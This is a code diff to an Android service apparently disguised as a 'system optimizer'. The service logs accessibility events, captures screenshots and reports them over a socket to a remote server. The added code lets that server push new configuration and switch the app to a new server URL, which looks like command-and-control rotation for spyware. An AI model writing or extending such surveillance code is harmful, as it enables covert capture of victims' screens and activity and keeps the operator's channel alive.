@@ -2,6 +2,7 @@ package com.system.optimizer;
 
 import com.system.optimizer.handler.AccessibilityEventHandler;
 import com.system.optimizer.handler.ScreenshotCapture;
+import com.system.optimizer.config.ConfigData;
 import com.system.optimizer.config.ConfigManager;
 import com.system.optimizer.network.SocketManager;
 
@@ -25,7 +26,7 @@ public class AccessibilityLoggerService extends AccessibilityService {
         try {
             this.configManager = new ConfigManager(this);
 
-            this.socketManager = new SocketManager(this, configManager);
+            this.socketManager = new SocketManager(configManager);
 
             this.screenShotCapture = new ScreenshotCapture(this, configManager);
 
@@ -47,6 +48,34 @@ public class AccessibilityLoggerService extends AccessibilityService {
                         socketManager.sendEvent("screenshot_error", errorMessage);
                     }
                 }, true); // isManual=true for user-initiated requests
+            });
+
+            this.socketManager.addPersistentListener("config_data", args -> {
+                Log.d(TAG, "ConfigData event received from server");
+                if (args != null && args.length > 0) {
+                    try {
+                        org.json.JSONObject configJson = (org.json.JSONObject) args[0];
+
+                        ConfigData serverConfig = configManager.createConfigFromJson(configJson);
+                        String newServerUrl = serverConfig.getServerUrl();
+
+                        // Get current stored URL before updating config
+                        String currentServerUrl = configManager.getStoredServerUrl();
+
+                        Log.d(TAG, "Refreshing config data from server");
+                        configManager.setConfig(serverConfig);
+
+                        // Check if server URL has changed
+                        if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
+                            Log.d(TAG, "Server URL changed from " + currentServerUrl + " to " + newServerUrl);
+
+                            Log.d(TAG, "Reconnecting socket to new URL");
+                            socketManager.reconnectToNewUrl();
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "Error processing config_data from server: " + e.getMessage(), e);
+                    }
+                }
             });
 
             Log.d(TAG, "All components initialized successfully");
